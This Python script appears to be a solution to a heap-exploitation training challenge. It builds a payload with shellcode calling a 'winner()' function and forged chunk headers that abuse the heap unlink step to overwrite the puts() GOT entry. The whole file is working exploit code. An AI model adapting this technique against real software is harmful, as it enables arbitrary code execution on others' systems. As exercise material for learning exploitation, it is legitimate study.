import sys
import struct

PUTS = 0x0804b128 - 12 # GOT location for the puts() address
WINNER = 0x08048864   # Address of the winner() function
RETADDR = 0x0804c014# Address EIP jumps to after calling puts()
 
# Chunk A
out  = b""
 
# https://defuse.ca/online-x86-assembler.htm
# mv eax, WINNER
# call eax
shellcode = b"\xB8\x64\x88\x04\x08\xFF\xD0"
out += b"\x90"*12 + shellcode
out += b" "

# Chunk B
out += b"B"*36 # Starts the next argument for chunk B
out += b"\x65"
out += b" "

# Chunk C
out += b"C"*92 # Starts the next argument for chunk C
out += struct.pack("I", 0xfffffffc) # prev_size
out += struct.pack("I", 0xfffffffc) # size
out += struct.pack("I", PUTS) # P->fd
out += struct.pack("I", RETADDR) # P->bk

with open("/tmp/payload", "wb") as file:
    file.write(out)